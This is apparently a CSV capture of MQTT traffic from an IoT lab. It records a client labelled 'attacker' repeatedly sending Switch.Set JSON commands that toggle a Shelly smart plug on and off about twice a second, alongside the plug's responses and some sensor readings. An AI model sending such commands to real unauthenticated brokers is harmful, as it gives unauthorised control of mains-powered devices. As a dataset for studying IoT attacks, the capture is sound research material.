timestamp,topic,payload_size_bytes,payload_preview
2026-04-22T16:17:47,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:47,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33200.35,""swi"
2026-04-22T16:17:47,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3554 33200.375 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:48,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:48,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:48,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3555 33200.857 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:48,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:48,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33200.85,""swi"
2026-04-22T16:17:48,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3556 33200.874 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:48,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:48,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:48,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3557 33201.357 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:48,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:48,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33201.35,""swi"
2026-04-22T16:17:48,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3558 33201.376 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:49,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:49,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:49,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3559 33201.858 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:49,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:49,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33201.85,""swi"
2026-04-22T16:17:49,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3560 33201.874 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:49,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:49,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:17:49,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:49,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3561 33202.358 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:49,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:17:49,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:49,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33202.36,""swi"
2026-04-22T16:17:49,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3562 33202.377 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:50,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:50,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:50,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3563 33202.858 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:50,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:50,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33202.86,""swi"
2026-04-22T16:17:50,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3564 33202.875 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:50,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:50,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:50,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3565 33203.360 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:50,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:50,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33203.36,""swi"
2026-04-22T16:17:50,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3566 33203.378 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:51,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:51,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:51,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3567 33203.861 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:51,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:51,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33203.86,""swi"
2026-04-22T16:17:51,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3568 33203.877 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:51,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:51,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:51,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3569 33204.360 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:51,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:51,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33204.36,""swi"
2026-04-22T16:17:51,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3570 33204.379 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:52,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:52,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:52,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3571 33204.860 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:52,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:52,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33204.86,""swi"
2026-04-22T16:17:52,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3572 33204.877 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:52,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:52,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:52,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3573 33205.361 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:52,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:52,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33205.36,""swi"
2026-04-22T16:17:52,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3574 33205.380 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:53,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:53,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:53,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3575 33205.862 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:53,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:53,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33205.86,""swi"
2026-04-22T16:17:53,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3576 33205.878 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:53,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:53,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:53,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3577 33206.362 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:53,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:53,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33206.36,""swi"
2026-04-22T16:17:53,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3578 33206.381 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:54,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:54,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:54,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3579 33206.863 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:54,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:54,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33206.86,""swi"
2026-04-22T16:17:54,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3580 33206.879 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:54,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:54,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:17:54,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:17:54,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:54,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3581 33207.363 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:54,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:54,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33207.36,""swi"
2026-04-22T16:17:54,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3582 33207.382 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:55,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:55,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:55,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3583 33207.867 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:55,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:55,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33207.86,""swi"
2026-04-22T16:17:55,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3584 33207.883 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:55,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:55,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:55,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3585 33208.366 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:55,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:55,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33208.36,""swi"
2026-04-22T16:17:55,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3586 33208.385 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:56,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:56,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:56,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3587 33208.865 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:56,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:56,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33208.86,""swi"
2026-04-22T16:17:56,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3588 33208.881 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:17:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:17:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:17:56,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:17:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:17:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:17:56,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:17:56,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:17:56,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3589 33209.365 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:56,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:17:56,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33209.36,""swi"
2026-04-22T16:17:56,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3590 33209.384 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:17:57,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:17:57,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:17:57,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3591 33209.865 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:17:57,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:17:57,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33209.86,""swi"
